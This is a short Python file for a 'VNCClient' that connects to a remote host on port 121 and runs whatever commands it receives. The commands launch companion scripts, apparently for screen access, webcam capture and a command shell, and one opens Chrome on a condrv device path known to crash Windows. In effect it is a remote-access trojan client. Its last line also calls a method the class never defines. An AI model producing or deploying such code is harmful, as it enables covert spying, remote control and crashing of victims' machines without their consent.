import socket
import subprocess
import os
from lib.host import ipadd


class VNCClient:
    def __init__(self, ip, port):

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))
        while True:
            self.a = self.s.recv(1024)
            self.a = self.a.decode()
            if self.a == 'win':
                print("WIN")
                print(f"command = {self.a}")
                subprocess.call('start win.pyw', shell=True)
            elif self.a == 'cam':
                print("CAM")
                print(f"command = {self.a}")
                subprocess.call('start cam.pyw', shell=True)
            elif self.a == 'cmd':
                print("CMD")
                subprocess.call('start cmdc.pyw', shell=True)
                print(f"command = {self.a}")
            elif self.a == 'cpfl':
                # os.system(
                #     'start chrome "*\*\*\.\globalroot\device\condrv\kernelconnect" --kiosk')
                subprocess.Popen(
                    ["chrome", "\\\\\\.\globalroot\device\condrv\kernelconnect"])

            elif self.a == 'X':
                print(f"command = {self.a}")


myclient = VNCClient(ipadd, 121)
myclient.execute_handler()
